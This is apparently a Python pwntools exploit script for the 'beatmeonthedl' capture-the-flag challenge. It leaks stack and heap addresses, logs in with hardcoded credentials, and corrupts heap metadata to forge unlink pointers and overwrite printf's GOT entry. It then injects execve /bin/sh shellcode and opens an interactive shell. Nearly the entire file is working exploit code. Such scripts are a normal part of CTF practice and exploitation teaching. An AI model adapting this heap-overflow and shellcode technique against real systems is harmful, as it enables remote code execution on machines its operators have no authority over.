from pwn import *

debug = False

if debug:
	r = process("gdb")
	r.sendline("file beatmeonthedl")

	r.sendline("b *0x4012EE") #breakpoint no

	r.sendline("r")
else:
	#r = process("./beatmeonthedl")
	#r = remote("beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me", 6969)

	r = remote("localhost", 1337)

reqList = 0x609E80
printfGot = 0x609970

### functions ###
def menu():
	return r.recvuntil("| ")

def addSploit(sploit):
	print("Adding sploit...")
	r.sendline("1")
	r.recvuntil("text > ")
	r.send(sploit)
	print(menu())

def listSploits():
	r.sendline("2")
	print(menu())

def changeSploit(sploit, index, getMenu=True):
	print("Changing sploit...")
	r.sendline("4")
	r.recvuntil("choice: ")
	r.sendline(str(index))
	r.recvuntil("data: ")
	r.send(sploit)
	if getMenu:
		print(menu())

def deleteSploit(index):
	print("Deleting sploit...")
	r.sendline("3")
	r.recvuntil("choice: ")
	r.sendline(str(index))
	print(menu())

#1 - Leak stack address -> 0x7fffffffe390
s = r.recvuntil("Enter username: ")
r.send("A"*16)

s = r.recvuntil("Enter username: ")
index = s.find("A"*16)+16
sStackAddress = s[index:index+6]
stackAddress = struct.unpack("<Q", sStackAddress.ljust(8, "\x00"))[0]
print("Leak stack address: %s" % hex(stackAddress))

#2 - Leak heap address -> 0x60a010
r.sendline("mcfly")
s = r.recvuntil("Enter Pass: ")
r.send("A"*24)

s = r.recvuntil("Enter username: ")
index = s.find("A"*24)+24
sHeapAddress = s[index:index+4]
if sHeapAddress[3] == "\n":
	sHeapAddress = sHeapAddress[0:3]

heapAddress = struct.unpack("<Q", sHeapAddress.ljust(8, "\x00"))[0]
print("Leak heap address: %s" % hex(heapAddress))

#3 - Login
r.sendline("mcfly")
s = r.recvuntil("Enter Pass: ")
r.sendline("awesnap")

#4 - Overflow heap
menu()

addSploit("A"*0x38)
addSploit("B"*0x38)

fakeFD = reqList-0x18
fakeBK = reqList-0x10
payload = (("D"*16 + p64(fakeFD) + p64(fakeBK)).ljust(64-8-8, "E") + p64(0x30) + p64(0x42))
changeSploit(payload, 0)

listSploits()

deleteSploit(1)

changeSploit("X"*24 + p64(printfGot), 0)

addSploit("\x90"*100 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

heapOffset = 0x60a060-0x60a010
shellCodeAddress = heapAddress + heapOffset + 20

changeSploit(p64(shellCodeAddress), 0, False)

r.interactive()
